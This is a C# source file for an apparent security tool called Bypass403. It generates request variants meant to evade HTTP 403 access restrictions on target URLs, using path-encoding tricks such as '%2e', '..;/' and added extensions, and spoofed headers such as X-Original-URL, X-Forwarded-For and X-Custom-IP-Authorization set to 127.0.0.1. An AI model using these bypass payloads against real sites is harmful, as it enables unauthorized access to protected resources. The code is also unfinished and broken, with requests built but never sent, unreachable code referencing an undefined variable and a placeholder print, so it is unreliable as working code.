using System.Net.Http.Headers;
using System;
using Microsoft.Win32.SafeHandles;

namespace Bypass403
{
    internal class Program
    {
        public static List<string> mandatoryArgs = new List<string>() { "-f" };

        public class RequestDefinition
        {
            public string Url { get; set; }
            public string HeaderName { get; set; }
            public string HeaderValue { get; set; }
        }

        private static string SendReq(RequestDefinition req)
        {
            HttpClient c = new HttpClient();
            //HttpClient req = new HttpClient(handler);
            c.DefaultRequestHeaders.TryAddWithoutValidation("Accept", "application/json, text/plain, */*");
            HttpRequestMessage reqMsg = new HttpRequestMessage();
            reqMsg.Method = HttpMethod.Get;
            reqMsg.Headers.Host = req.Url;
            reqMsg.RequestUri = new Uri(req.Url);
            c.DefaultRequestHeaders.Add("Connection", "keep-alive");

            if (!string.IsNullOrEmpty(req.HeaderName) && !string.IsNullOrEmpty(req.HeaderValue))
                reqMsg.Headers.Add(req.HeaderName, req.HeaderValue);
            //reqMsg.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0");
            //c.DefaultRequestHeaders.TryAddWithoutValidation("Accept-Language", "en-US,en;q=0.5");
            //reqMsg.Headers.AcceptEncoding.Add(new StringWithQualityHeaderValue("gzip"));
            //reqMsg.Headers.AcceptEncoding.Add(new StringWithQualityHeaderValue("deflate"));
            //reqMsg.Headers.AcceptEncoding.Add(new StringWithQualityHeaderValue("br"));
            reqMsg.Headers.Referrer = new Uri(req.Url);
            reqMsg.Headers.Add("Origin", req.Url);
            HttpResponseMessage response = c.SendAsync(reqMsg).Result;
            string result = response.Content.ReadAsStringAsync().Result;
            return response.StatusCode.ToString();
            //using (var sw = new StreamWriter(resultsPath, true))
            //{
            //    if (File.Exists(resultsPath))
            //    {
            //        sw.WriteLine("FileName: " + f);
            //    }
            //}

            using (StreamWriter file = new StreamWriter("log.txt", append: true))
            {

                file.WriteLine(DateTime.Now.ToString("yyyy - MM - dd HH: mm:ss") + "\tUser_Id:" + user_id.ToString() + " ::response:" + result);
                Thread.Sleep(100);
            }
        }

        static List<RequestDefinition> ConstructUrls(string[] urls, string word)
        {
            string response_code = string.Empty;
            List<RequestDefinition> tailored_urls = new List<RequestDefinition>();
            word = !string.IsNullOrEmpty(word) ? "/" + word : string.Empty;
            foreach (string url in urls)
            {
                tailored_urls.Add(new RequestDefinition() { Url = url + word });
                tailored_urls.Add(new RequestDefinition() { Url = url + "/%2e" + word });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + "/." });
                tailored_urls.Add(new RequestDefinition() { Url = url + "/" + word + "//" });
                tailored_urls.Add(new RequestDefinition() { Url = url + "/." + word + "/./" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + "%20" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + "%09" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + "?" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + ".html" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + "/?anything" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + "#" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + "/*" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + ".php" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + ".json" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + ".aspx" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + ".asp" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word + "..;/" });

                tailored_urls.Add(new RequestDefinition() { Url = url + word, HeaderName = "X-Original-URL", HeaderValue = word });
                tailored_urls.Add(new RequestDefinition() { Url = url + word, HeaderName = "X-Custom-IP-Authorization", HeaderValue = "127.0.0.1" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word, HeaderName = "X-Forwarded-For", HeaderValue = "127.0.0.1:80" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word, HeaderName = "X-rewrite-url", HeaderValue = word });
                tailored_urls.Add(new RequestDefinition() { Url = url + word, HeaderName = "Original", HeaderValue = word });
                tailored_urls.Add(new RequestDefinition() { Url = url + word, HeaderName = "Content-Length", HeaderValue = "0" });
                tailored_urls.Add(new RequestDefinition() { Url = url + word, HeaderName = "X-Host", HeaderValue = "127.0.0.1" });

            }
            return tailored_urls;
        }

        static void Main(string[] args)
        {

            Dictionary<string, string> namedArguments = ParseNamedArguments(args);
            CheckMandatoryArguments(namedArguments);
            string urlFile = namedArguments["-f"];
            string word = namedArguments.ContainsKey("-w") ? namedArguments["-w"] : "";
            string resultPath = namedArguments.ContainsKey("-o") ? namedArguments["-o"] : "";

            string[] readUrls = File.ReadAllLines(urlFile);
            List<RequestDefinition> constructed_reqs = ConstructUrls(readUrls, word);


            Console.WriteLine("asdasdads");
        }

        static Dictionary<string, string> ParseNamedArguments(string[] args)
        {
            var namedArguments = new Dictionary<string, string>();
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].StartsWith("-"))
                {
                    string key = args[i];
                    string value = i + 1 < args.Length && !args[i + 1].StartsWith("-") ? args[i + 1] : null;
                    namedArguments[key] = value;
                }
            }
            return namedArguments;
        }
        static void CheckMandatoryArguments(Dictionary<string, string> namedArgs)
        {
            foreach (string mArg in mandatoryArgs)
            {
                if (!namedArgs.ContainsKey(mArg))
                {
                    Console.WriteLine("Mandatory argument " + mArg + " is missing");
                    Environment.Exit(1);
                }
            }
        }
    }
}
